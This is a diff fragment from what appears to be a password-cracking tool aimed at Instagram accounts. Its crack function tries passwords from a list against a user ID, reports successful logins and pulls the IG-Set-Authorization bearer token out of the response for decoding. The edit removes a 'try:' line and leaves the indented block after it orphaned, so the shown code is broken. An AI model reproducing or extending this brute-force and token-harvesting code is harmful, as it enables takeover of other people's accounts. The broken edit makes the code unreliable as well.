@@ -228,7 +228,6 @@ def crack(uid, password_list, total_count):
             if 'logged_in_user' in response.text:
                 print(f"\r\033[1;92m [✓ SUCCESS] {uid} | {pw}")
                 if match := re.search(r'"IG-Set-Authorization":\s*"(.*?)"', response.text.replace('\\', '')):
-                    try:
                         # Split and decode with proper error handling
                         token_part = match.group(1).split('Bearer IGT:2:')[1]
                         # Fix base64 padding properly
